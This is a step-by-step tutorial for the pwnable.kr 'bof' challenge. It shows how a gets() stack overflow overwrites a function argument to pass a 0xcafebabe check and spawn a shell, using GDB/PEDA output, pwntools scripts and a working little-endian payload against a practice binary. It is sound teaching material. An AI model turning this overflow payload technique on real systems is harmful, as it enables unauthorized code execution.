# bof @ pwnable.kr

This challenge originally comes from [pwnable.kr](http://pwnable.kr/play.php). 
This is the same binary and is essentially a practical walk through.
Please go and play the other challenges on the site. They are excellent.

For this challenge there are a couple of things you should know.

 * When I first started playing pwnable.kr, it took me several days to solve this. So don't get discouraged.
 * A lot of information out there talks about overwriting the return pointer on the stack (don't worry if this doesn't make any sense at the moment). That is not the goal of this challenge
 * It's OK to watch a walkthrough as long as you walk away understanding WHY/HOW the challenge was solved.
 * [Video walkthrough](https://www.youtube.com/watch?v=BxSD0cSjyNg&t=13s), But it still may be a bit impractical.
 * [Excellent Video on this topic](https://www.youtube.com/watch?v=T03idxny9jE). All his videos are great, highly recommend his channel.

_There is a LOT to learn, and the goal of this page is to walk you through a practical process of solving this challenge. You may not understand all of the finer details, but that will come later on_

So where to start?

First let's install some tools. I would advise running a system with Ubuntu 16.04 (or 14.04)

Install: [pwntools](https://github.com/Gallopsled/pwntools) please head over there and look up how to install this excellent python module.

It is also recommended that you use something to make the use of GDB a bit 'friendlier'.

I would recommend using one of the following:
 - [PEDA](https://github.com/longld/peda)
 - [pwndbg](https://github.com/pwndbg/pwndbg)

---
Now that you have all of that installed and you have done a local clone of this repo let's proceed and look at the source code
[bof.c](/master/bof/bof.c)
Specifically this code:
```C
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
```

 We see that `key` is an argument passed to the `func()` function. 
 
 We also see `overflowme[32]` is an array the holds 32 bytes.
 
 There is a call to `gets()` with the pointer to `overflowme` as the buffer. 
 
 Then `key` is checked to see if it is a certain value `0xcafebabe`.
 
The vulnerability lies in the fact that you can pass more than 32 bytes to the `gets()` function. It will keep reading data till a return(`\n`) is encountered.

When a function is called, it will push the argument to the stack and then call the function. 
Upon entering the function it will allocate stack space to use in that function. Since the stack grows from high addresses towards low addresses the stack will look like this at the time we really start executing the C code in the `func` function:
```
-------------------------
 Lower Stack Addresses
-------------------------
0x1ac   overflowme       <---- The location we're writing to with gets()
...
0x1c8   end of overflowme
.
.
.
.
0x1dc   Return Pointer
0x1e0   key              <---- Location we're trying to overwrite
-------------------------
 Higher Stack Addresses
-------------------------
```
So overflowing `overflowme` will allow us to eventually overwrite the value of `key`. If this doesn't quite 'click' at the moment, just proceed and see if it makes sense as you do the next steps.

Let's fire up a script to step through what is actually happening.

Try running the [step1.py](./step1.py) script and reading through what it's doing.
Run the script with the `-d` option it will cause gdb to attach to the running process with the breakpoint set at exactly the start of `func()`

RUN: `./step1.py -d`

---

Now if all went well, and you loaded [PEDA](https://github.com/longld/peda), You should see something like this:
```asm
 [----------------------------------registers-----------------------------------]
EAX: 0xf76e6dbc --> 0xffd9cbcc --> 0xffd9d312 ("GLADE_PIXMAP_PATH=:")
EBX: 0x0 
ECX: 0x4b62348c 
EDX: 0xffd9cb54 --> 0x0 
ESI: 0xf76e5000 --> 0x1b1db0 
EDI: 0xf76e5000 --> 0x1b1db0 
EBP: 0xffd9cb28 --> 0x0 
ESP: 0xffd9cb0c --> 0x5665169f (<main+21>:      mov    eax,0x0)
EIP: 0x5665162c (<func>:        push   ebp)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56651627 <__i686.get_pc_thunk.bx>: mov    ebx,DWORD PTR [esp]
   0x5665162a <__i686.get_pc_thunk.bx+3>:       ret    
   0x5665162b <__i686.get_pc_thunk.bx+4>:       nop
=> 0x5665162c <func>:   push   ebp
   0x5665162d <func+1>: mov    ebp,esp
   0x5665162f <func+3>: sub    esp,0x48
   0x56651632 <func+6>: mov    eax,gs:0x14
   0x56651638 <func+12>:        mov    DWORD PTR [ebp-0xc],eax
[------------------------------------stack-------------------------------------]
0000| 0xffd9cb0c --> 0x5665169f (<main+21>:     mov    eax,0x0)
0004| 0xffd9cb10 --> 0xdeadbeef 
0008| 0xffd9cb14 --> 0x56651250 --> 0x6e ('n')
0012| 0xffd9cb18 --> 0x566516b9 (<__libc_csu_init+9>:   add    ebx,0x193b)
0016| 0xffd9cb1c --> 0x0 
0020| 0xffd9cb20 --> 0xf76e5000 --> 0x1b1db0 
0024| 0xffd9cb24 --> 0xf76e5000 --> 0x1b1db0 
0028| 0xffd9cb28 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ 
```

If none of this makes sense, don't worry about it right now. Just keep going.

Now if we want to look at the whole assembly of the `func` we can issue the command `disassemble func`
```asm
gdb-peda$ disassemble func
Dump of assembler code for function func:
=> 0x5665162c <+0>:     push   ebp
   0x5665162d <+1>:     mov    ebp,esp
   0x5665162f <+3>:     sub    esp,0x48
   0x56651632 <+6>:     mov    eax,gs:0x14
   0x56651638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x5665163b <+15>:    xor    eax,eax
   0x5665163d <+17>:    mov    DWORD PTR [esp],0x5665178c
   0x56651644 <+24>:    call   0xf7592ca0 <_IO_puts>
   0x56651649 <+29>:    lea    eax,[ebp-0x2c]
   0x5665164c <+32>:    mov    DWORD PTR [esp],eax
   0x5665164f <+35>:    call   0xf75923e0 <_IO_gets>
   0x56651654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5665165b <+47>:    jne    0x5665166b <func+63>
   0x5665165d <+49>:    mov    DWORD PTR [esp],0x5665179b
   0x56651664 <+56>:    call   0xf756dda0 <__libc_system>
   0x56651669 <+61>:    jmp    0x56651677 <func+75>
   0x5665166b <+63>:    mov    DWORD PTR [esp],0x566517a3
   0x56651672 <+70>:    call   0xf7592ca0 <_IO_puts>
   0x56651677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x5665167a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x56651681 <+85>:    je     0x56651688 <func+92>
   0x56651683 <+87>:    call   0xf762a4c0 <__stack_chk_fail>
   0x56651688 <+92>:    leave  
   0x56651689 <+93>:    ret    
End of assembler dump.
```
Remember the source code... Does anything look familiar between the disassembly and the source?
```C
	printf("overflow me : ");                 // 0x56651644 <+24>:    call   0xf7592ca0 <_IO_puts>
	gets(overflowme);                         // 0x5665164f <+35>:    call   0xf75923e0 <_IO_gets>
	if(key == 0xcafebabe){                    // 0x56651654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
		system("/bin/sh");                // 0x56651664 <+56>:    call   0xf756dda0 <__libc_system>
	}
```

So now we can see exactly when the input is passed to the program (`0x5665164f <+35>`)
Let's step through the instructions till we get to that instruction. You do this by typing `next` and enter.
Now press enter again to repeat that gdb command and step to the next instruction. Do this till the arrow in the disassembly is pointing to `0x5665164f <+35>`.

```asm
 [----------------------------------registers-----------------------------------]
EAX: 0xffd9cadc --> 0xffd9caec --> 0xffd9caff --> 0x6e5000b9 
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xf76e6870 --> 0x0 
ESI: 0xf76e5000 --> 0x1b1db0 
EDI: 0xf76e5000 --> 0x1b1db0 
EBP: 0xffd9cb08 --> 0xffd9cb28 --> 0x0 
ESP: 0xffd9cac0 --> 0xffd9cadc --> 0xffd9caec --> 0xffd9caff --> 0x6e5000b9 
EIP: 0x5665164f (<func+35>:     call   0xf75923e0 <_IO_gets>)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56651644 <func+24>:        call   0xf7592ca0 <_IO_puts>
   0x56651649 <func+29>:        lea    eax,[ebp-0x2c]
   0x5665164c <func+32>:        mov    DWORD PTR [esp],eax
=> 0x5665164f <func+35>:        call   0xf75923e0 <_IO_gets>
   0x56651654 <func+40>:        cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5665165b <func+47>:        jne    0x5665166b <func+63>
   0x5665165d <func+49>:        mov    DWORD PTR [esp],0x5665179b
   0x56651664 <func+56>:        call   0xf756dda0 <__libc_system>
Guessed arguments:
arg[0]: 0xffd9cadc --> 0xffd9caec --> 0xffd9caff --> 0x6e5000b9 
[------------------------------------stack-------------------------------------]
0000| 0xffd9cac0 --> 0xffd9cadc --> 0xffd9caec --> 0xffd9caff --> 0x6e5000b9 
0004| 0xffd9cac4 --> 0xffd9cb64 --> 0x519fba9d 
0008| 0xffd9cac8 --> 0xf76e5000 --> 0x1b1db0 
0012| 0xffd9cacc --> 0x9d57 
0016| 0xffd9cad0 --> 0xffffffff 
0020| 0xffd9cad4 --> 0x2f ('/')
0024| 0xffd9cad8 --> 0xf753fdc8 (jbe    0xf753fdf5)
0028| 0xffd9cadc --> 0xffd9caec --> 0xffd9caff --> 0x6e5000b9 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ 
```

Great! [PEDA](https://github.com/longld/peda) did some guessing for us, and we can see that the argument passed to `gets()` is a pointer on the stack:
```
Guessed arguments:
arg[0]: 0xffd9cadc --> 0xffd9caec --> 0xffd9caff --> 0x6e5000b9 
```

Let's look at that memory. We can do this with the command `telescope` with the memory location in hex and if we want, a number of 32bit(4 byte) values to print. In this case we want to look at the memory being passed in arg0 `0xffd9cadc` and we want to print 12 x 4byte values.
```asm
gdb-peda$ telescope 0xffd9cadc 12
0000| 0xffd9cadc --> 0xffd9caec --> 0xffd9caff --> 0x6e5000b9 
0004| 0xffd9cae0 --> 0x0 
0008| 0xffd9cae4 --> 0x4b62348c 
0012| 0xffd9cae8 --> 0xf75e40d8 (<__GI___getpid+40>:    test   edx,edx)
0016| 0xffd9caec --> 0xffd9caff --> 0x6e5000b9 
0020| 0xffd9caf0 --> 0x1 
0024| 0xffd9caf4 --> 0x0 
0028| 0xffd9caf8 --> 0x56652ff4 --> 0x1f14 
0032| 0xffd9cafc --> 0xb90b0300 
0036| 0xffd9cb00 --> 0xf76e5000 --> 0x1b1db0 
0040| 0xffd9cb04 --> 0xf76e5000 --> 0x1b1db0 
0044| 0xffd9cb08 --> 0xffd9cb28 --> 0x0 
gdb-peda$ 
```
Why 12 values? The `overflowme[32]` buffer is 32bytes. That means 32/4 = 8. I want to see several locations after that in the stack, so I picked 12.

At the moment, you can see that the memory is these locations is uninitialized. Meaning that old stack values are still there. We don't need to worry about what these mean right now. Just that what we pass to the input will show up in this location.

---

Let's take a quick look at the [step1.py](./step1.py) script and what it's doing:
```python
  #wait_for_prompt(r)
  payload  = cyclic(100)
  r.sendline(payload) 

  # Drop to interactive console
  r.interactive()
```
Normally we may want to wait for a prompt and then send the payload. In this case we don't wait and we start sending data to STDIN

This will get read in by the `gets()` in the vulnerable program. 

And I hear you asking, what is the `cyclic(100)` do? Great question!!! `cyclic()` is a function in pwntools that will create a pattern string that we can use to easily identify offsets with. Let's look at what it does in an interactive python session:
```python
$ python
Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(100)
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>>> 
```

So our script is passing `aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa` as input.

---

Let's switch back to [PEDA](https://github.com/longld/peda) and execute the next instuction (`0x5665164f <func+35>:        call   0xf75923e0 <_IO_gets>`)

Remember, type `next` and press enter. You should now see this:
```asm
 [----------------------------------registers-----------------------------------]
EAX: 0xffd9cadc ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
EBX: 0x0 
ECX: 0xf76e55a0 --> 0xfbad2088 
EDX: 0xf76e687c --> 0x0 
ESI: 0xf76e5000 --> 0x1b1db0 
EDI: 0xf76e5000 --> 0x1b1db0 
EBP: 0xffd9cb08 ("laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
ESP: 0xffd9cac0 --> 0xffd9cadc ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
EIP: 0x56651654 (<func+40>:     cmp    DWORD PTR [ebp+0x8],0xcafebabe)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56651649 <func+29>:        lea    eax,[ebp-0x2c]
   0x5665164c <func+32>:        mov    DWORD PTR [esp],eax
   0x5665164f <func+35>:        call   0xf75923e0 <_IO_gets>
=> 0x56651654 <func+40>:        cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5665165b <func+47>:        jne    0x5665166b <func+63>
   0x5665165d <func+49>:        mov    DWORD PTR [esp],0x5665179b
   0x56651664 <func+56>:        call   0xf756dda0 <__libc_system>
   0x56651669 <func+61>:        jmp    0x56651677 <func+75>
[------------------------------------stack-------------------------------------]
0000| 0xffd9cac0 --> 0xffd9cadc ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0004| 0xffd9cac4 --> 0xffd9cb64 --> 0x519fba9d 
0008| 0xffd9cac8 --> 0xf76e5000 --> 0x1b1db0 
0012| 0xffd9cacc --> 0x9d57 
0016| 0xffd9cad0 --> 0xffffffff 
0020| 0xffd9cad4 --> 0x2f ('/')
0024| 0xffd9cad8 --> 0xf753fdc8 (jbe    0xf753fdf5)
0028| 0xffd9cadc ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ 
```
Remember that pointer that got passed to `gets()`? Let's print that out again:
```asm
gdb-peda$ telescope 0xffd9cadc 12
0000| 0xffd9cadc ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0004| 0xffd9cae0 ("baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0008| 0xffd9cae4 ("caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0012| 0xffd9cae8 ("daaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0016| 0xffd9caec ("eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0020| 0xffd9caf0 ("faaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0024| 0xffd9caf4 ("gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0028| 0xffd9caf8 ("haaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0032| 0xffd9cafc ("iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0036| 0xffd9cb00 ("jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0040| 0xffd9cb04 ("kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
0044| 0xffd9cb08 ("laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
```

OK, that all looks familiar. Great we see that our input was successfully read into memory, and it overflowed the 32 bytes of the buffer.

We also see that the very next instruction is: 

`=> 0x56651654 <func+40>:        cmp    DWORD PTR [ebp+0x8],0xcafebabe`

This is the comparison of `key` to the constant `0xcafebabe`

`if(key == 0xcafebabe)`

Great! So let's see what the value of `key` is.

**SideNote:** This notation `DWORD PTR [ebp+0x8]` means... the value in memory at address `ebp+0x8`. 

With gdb and PEDA, we can look at this value by doing:
```asm
gdb-peda$ telescope $ebp+0x8 1
0000| 0xffd9cb10 ("naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")
```
This means that the value of `key` is `naaa`. This is GREAT news, because we control that since it was part of our input!

Our input was: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaa~~naaa~~oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa. We can now easily replace the `naaa` with 0xcafebabe.

Let's exit gdb/PEDA by typing `quit`

Then make some modifications to our [step1.py](./step1.py) and make a [step2.py](./step2.py) scripts (also checked in already).

Two changes:

First, let's set the breakpoint at the comparison instruction. So we get there faster:
```python
  if args.dbg:
    r = gdb.debug([exe], gdbscript="""
    b *func+40
    continue
    """)
```
Secondly, let's modify the payload by sending all the data up till the `naaa` and then adding our hex 0xcafebabe.
```python
  #wait_for_prompt(r)
  payload  = 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaa' + '\xbe\xba\xfe\xca'
  r.sendline(payload) 
```

Please note that it's `\xbe\xba\xfe\xca` and not `\xca\xfe\xba\xbe`. This is due to it being little endian.

Now let's run the [step2.py -d](./step2.py) and see what happens when we hit the break.
```asm
 [----------------------------------registers-----------------------------------]
EAX: 0xff90447c ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaa\276\272\376", <incomplete sequence \312>)
EBX: 0x0 
ECX: 0xf777c5a0 --> 0xfbad2088 
EDX: 0xf777d87c --> 0x0 
ESI: 0xf777c000 --> 0x1b1db0 
EDI: 0xf777c000 --> 0x1b1db0 
EBP: 0xff9044a8 ("laaamaaa\276\272\376", <incomplete sequence \312>)
ESP: 0xff904460 --> 0xff90447c ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaa\276\272\376", <incomplete sequence \312>)
EIP: 0x5657c654 (<func+40>:     cmp    DWORD PTR [ebp+0x8],0xcafebabe)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5657c649 <func+29>:        lea    eax,[ebp-0x2c]
   0x5657c64c <func+32>:        mov    DWORD PTR [esp],eax
   0x5657c64f <func+35>:        call   0xf76293e0 <_IO_gets>
=> 0x5657c654 <func+40>:        cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5657c65b <func+47>:        jne    0x5657c66b <func+63>
   0x5657c65d <func+49>:        mov    DWORD PTR [esp],0x5657c79b
   0x5657c664 <func+56>:        call   0xf7604da0 <__libc_system>
   0x5657c669 <func+61>:        jmp    0x5657c677 <func+75>
[------------------------------------stack-------------------------------------]
0000| 0xff904460 --> 0xff90447c ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaa\276\272\376", <incomplete sequence \312>)
0004| 0xff904464 --> 0xff904504 --> 0xe4b7e1c6 
0008| 0xff904468 --> 0xf777c000 --> 0x1b1db0 
0012| 0xff90446c --> 0xd57 ('W\r')
0016| 0xff904470 --> 0xffffffff 
0020| 0xff904474 --> 0x2f ('/')
0024| 0xff904478 --> 0xf75d6dc8 (jbe    0xf75d6df5)
0028| 0xff90447c ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaa\276\272\376", <incomplete sequence \312>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$
```
OK, and now to look at the `$ebp+0x8` memory location to see if we did it right:
```asm 
gdb-peda$ telescope $ebp+0x8 1
0000| 0xff9044b0 --> 0xcafebabe 
gdb-peda$ 
```

Wooohoooo, I think we did it! The value of `key` should be `0xcafebabe` now. Let's step through to the next instruction:
```asm
=> 0x5657c65b <func+47>:        jne    0x5657c66b <func+63>
   0x5657c65d <func+49>:        mov    DWORD PTR [esp],0x5657c79b
   0x5657c664 <func+56>:        call   0xf7604da0 <__libc_system>
   0x5657c669 <func+61>:        jmp    0x5657c677 <func+75>
   0x5657c66b <func+63>:        mov    DWORD PTR [esp],0x5657c7a3
                                                              JUMP is NOT taken
```
As you can see, the `JUMP is NOT taken`. This means that the call to `system()` should take place. Feel free to step through the remaining code, or type `continue` and press enter.

Now it's time to try the script locally without the debugger attached:
```bash
~/code/how2bof/bof$ ./step2.py 
[+] Starting local process './bof': pid 4542
[*] Switching to interactive mode
overflow me : 
$ ls
bof    flag             README.md    step2.py
bof.c  step1.py 
$ cat flag
flag{test_flag_for_chall}
$ <cntl-d>
[*] Stopped process './bof' (pid 4542)
```
As you can see, we get dropped into an interactive shell and we can enter commands. If we do a `cat flag` we see that the flag is printed out.

Hopefully this has helped someone step through this process for the first time. If you made it this far, congratulations!  
Now go and play bof [pwnable.kr](http://pwnable.kr) and also come back to try out the other buffer overflow levels here.

